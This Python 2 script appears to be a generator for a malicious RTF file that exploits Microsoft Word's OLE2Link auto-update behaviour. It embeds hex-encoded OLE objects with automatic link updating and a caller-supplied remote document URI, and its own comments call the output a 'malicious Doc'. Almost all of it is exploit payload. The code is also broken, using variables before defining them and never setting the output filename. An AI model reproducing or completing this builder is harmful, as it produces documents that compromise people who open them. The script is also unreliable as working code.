#create a olelink

def generate_exploit_rtf(docuri):
    # Preparing malicious Doc
    s = docuri
    docuri_hex = "00".join("{:02x}".format(ord(c)) for c in s)
    docuri_pad_len = 224 - len(docuri_hex)
    docuri_pad = "0"*docuri_pad_len
    uri_hex = "010000020900000001000000000000000000000000000000a4000000e0c9ea79f9bace118c8200aa004ba90b8c000000"+docuri_hex+docuri_pad+"00000000795881f43b1d7f48af2c825dc485276300000000a5ab0000ffffffff0609020000000000c00000000000004600000000ffffffff0000000000000000906660a637b5d201000000000000000000000000000000000000000000000000100203000d0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    
    # RTF Header
    rtf_header = "{\\rtf1\\adeflang1025\\ansi\\ansicpg1252\\uc1\\adeff31507\\deff0\\stshfdbch31505\\stshfloch31506\\stshfhich31506\\stshfbi31507\\deflang1033\\deflangfe2052\\themelang1033\\themelangfe2052\\themelangcs0\n"
    rtf_header += "{\\info\n"
    rtf_header += "{\\author }\n"
    rtf_header += "{\\operator }\n"
    rtf_header += "}\n"
    rtf_header += "{\\*\\xmlnstbl {\\xmlns1 http://schemas.microsoft.com/office/word/2003/wordml}}\n"
    rtf_header += "{\n"
    
    # OLELINK OBJ
    olelink += "{\\object\\objautlink\\objupdate\\rsltpict\\objw291\\objh230\\objscalex99\\objscaley101\n"
    olelink += "{\\*\\objclass Word.Document.8}\n"
    olelink += "{\\*\\objdata 0105000002000000\n"
    olelink += "090000004f4c45324c696e6b000000000000000000000a0000\n"
    olelink += "d0cf11e0a1b11ae1000000000000000000000000000000003e000300feff0900060000000000000000000000010000000100000000000000001000000200000001000000feffffff0000000000000000ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n"
    olelink += "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n"
    olelink += "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n"
    olelink += "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n"
    olelink += "fffffffffffffffffdfffffffefffffffefffffffeffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n"
    olelink += "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n"
    olelink += "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n"
    olelink += "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n"
    olelink += "ffffffffffffffffffffffffffffffff52006f006f007400200045006e00740072007900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000016000500ffffffffffffffff020000000003000000000000c000000000000046000000000000000000000000704d\n"
    olelink += "6ca637b5d20103000000000200000000000001004f006c00650000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a000200ffffffffffffffffffffffff00000000000000000000000000000000000000000000000000000000\n"
    olelink += "000000000000000000000000f00000000000000003004f0062006a0049006e0066006f00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000120002010100000003000000ffffffff0000000000000000000000000000000000000000000000000000\n"
    olelink += "0000000000000000000004000000060000000000000003004c0069006e006b0049006e0066006f000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000014000200ffffffffffffffffffffffff000000000000000000000000000000000000000000000000\n"
    olelink += "00000000000000000000000005000000b700000000000000010000000200000003000000fefffffffeffffff0600000007000000feffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n"
    olelink += "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n"
    olelink += "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n"
    olelink += "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n"
    olelink += "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n"
    olelink += uri_hex+"\n"
    olelink += "0105000000000000}\n"
    olelink += "{\\result {\\rtlch\\fcs1 \\af31507 \\ltrch\\fcs0 \\insrsid1979324 }}}\n"
    
    # RTF  PADDING
    rtf_padding += "}{\\*\\datastore }\n"
    rtf_padding += "}\n"
    
    f = open(filename, 'w')
    f.write(rtf_header + olelink + rtf_padding)
    f.close()
    print "Generated "+filename+" successfully"
